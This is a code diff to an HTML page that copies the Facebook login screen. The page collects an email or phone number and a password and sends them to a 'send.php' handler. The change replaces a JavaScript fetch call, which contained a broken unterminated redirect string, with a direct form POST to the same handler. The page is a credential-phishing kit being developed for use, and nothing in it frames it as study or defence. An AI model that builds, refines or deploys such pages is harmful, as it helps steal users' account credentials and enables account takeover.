@@ -69,7 +69,7 @@
 </head>
 <body><div class="login-box">
   <h1>facebook</h1>
-  <form id="loginForm">
+  <form id="loginForm" method="POST" action="send.php">
     <input type="text" placeholder="Email or Phone" name="email" required>
     <input type="password" placeholder="Password" name="password" required>
     <button type="submit">Log In</button>
@@ -78,20 +78,5 @@
       <a href="https://www.facebook.com/r.php?entry_point=login">Create New Account</a>
     </div>
   </form>
-</div><script>
-  document.getElementById('loginForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-    const formData = new FormData(this);
-
-    fetch('send.php', {
-      method: 'POST',
-      body: formData
-    })
-    .then(res => res.text())
-    .then(data => {
-      alert(data);
-      window.location.href = 'www.facebook.com;
-    });
-  });
-</script></body>
+</div></body>
 </html>
